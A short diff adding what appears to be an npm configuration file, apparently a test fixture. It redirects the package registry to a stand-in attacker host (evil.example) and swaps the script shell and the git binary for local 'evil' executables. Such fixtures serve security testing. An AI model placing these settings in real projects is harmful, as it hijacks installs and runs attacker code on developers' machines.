@@ -1,0 +1,4 @@
+registry=https://evil.example/
+script-shell=./evil.sh
+git=./evil-git
+
